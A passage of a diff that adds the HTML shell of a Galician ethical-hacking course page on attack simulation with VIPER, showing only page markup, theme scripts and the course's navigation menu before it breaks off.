@@ -1,0 +1,4370 @@
+
+<!doctype html>
+<html lang="gl" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../s4vitar/">
+      
+      
+        <link rel="next" href="../../apendice/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>Simulación de ataques con VIPER - Hacking Ético - UD1 - Introdución á seguridade ofensiva</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../css/custom.css">
+    
+      <link rel="stylesheet" href="../../../css/opera.css">
+    
+      <link rel="stylesheet" href="../../../css/print.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#practica-de-taller-simulacion-de-ataques-con-viper" class="md-skip">
+          Ir ao contido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabeceira">
+    <a href="../../.." title="Hacking Ético - UD1 - Introdución á seguridade ofensiva" class="md-header__button md-logo" aria-label="Hacking Ético - UD1 - Introdución á seguridade ofensiva" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hacking Ético - UD1 - Introdución á seguridade ofensiva
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Simulación de ataques con VIPER
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Cambiar a modo oscuro"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo oscuro" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Cambiar a modo normal"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo normal" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Procura" placeholder="Procura" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Procurar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpar" aria-label="Limpar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando procura
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Pestanas" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  De interese
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../apuntamentos/he/" class="md-tabs__link">
+          
+  
+  
+  Apuntamentos UD1
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../informes-sysreptor/" class="md-tabs__link">
+          
+  
+  
+  Prácticas Taller UD1
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../apendice/" class="md-tabs__link">
+          
+  
+  
+  Apéndice
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Hacking Ético - UD1 - Introdución á seguridade ofensiva" class="md-nav__button md-logo" aria-label="Hacking Ético - UD1 - Introdución á seguridade ofensiva" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Hacking Ético - UD1 - Introdución á seguridade ofensiva
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    De interese
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Apuntamentos UD1
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Apuntamentos UD1
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/he/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Que é o Hacking Ético
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/tipos-hackers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tipos de Hackers
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/tipos-auditorias/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tipos de Auditorías
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/caid/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Fundamentos da Seguridade da Información (CAID)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Fases dun Test de Intrusión (Pentest)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_6" id="__nav_2_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Informes de Pentesting
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Informes de Pentesting
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/informes/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Informes
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/informes/CVE-2011-2523/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CVE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/informes/clasificacion_risco_cvss/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CVSS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/informes/cwe/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CWE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/etica/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ética e Legalidade
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/marcos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Marcos de traballo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/modelos-ataque-defensa/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Modelos de Ataque e Defensa
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_10" id="__nav_2_10_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ClearNet, Deep Web e Dark Web
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_10">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    ClearNet, Deep Web e Dark Web
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/clearnet_deepweb_darkweb/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Explicación
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/verificar_sinatura_tor/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Verificación sinatura Tor
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_11" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_11" id="__nav_2_11_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ferramentas
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_11_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_11">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Ferramentas
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/ferramentas/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Comúns
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/metasploit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Metasploit Framework
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/openvas/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OpenVAS / Greenbone
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/ollama/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Modelos de IA locais (Ollama)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/recursos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Recursos de Aprendizaxe
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../apuntamentos/viper/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    VIPER, Red Team e C2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Prácticas Taller UD1
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Prácticas Taller UD1
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Informes con sysreptor
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Informes con sysreptor
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../informes-sysreptor/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introdución
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-sysreptor/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Práctica Taller
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-openvas/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Análise de vulnerabilidades con OpenVAS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Modelos de IA locais (Ollama)
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Modelos de IA locais (Ollama)
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3_1" id="__nav_3_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Prácticas Taller
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Prácticas Taller
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-ollama-vm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Práctica 1 — Dentro dunha VM
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-ollama-host/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Práctica 2 — No equipo anfitrión (GPU)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-ollama-agentes/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Práctica 3 — Axentes e multiaxentes
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-ollama-agente-python/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Práctica 4 — Axente propio con Python
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-ollama-crewai/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Práctica 5 — Equipos de axentes con CrewAI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4" id="__nav_3_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Recursos de aprendizaxe
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Recursos de aprendizaxe
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4_1" id="__nav_3_4_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Metasploitable 2
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_4_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Metasploitable 2
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../metasploitable2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introdución
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-metasploitable2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Práctica Taller
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4_2" id="__nav_3_4_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Metasploitable 3
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Metasploitable 3
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../metasploitable3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
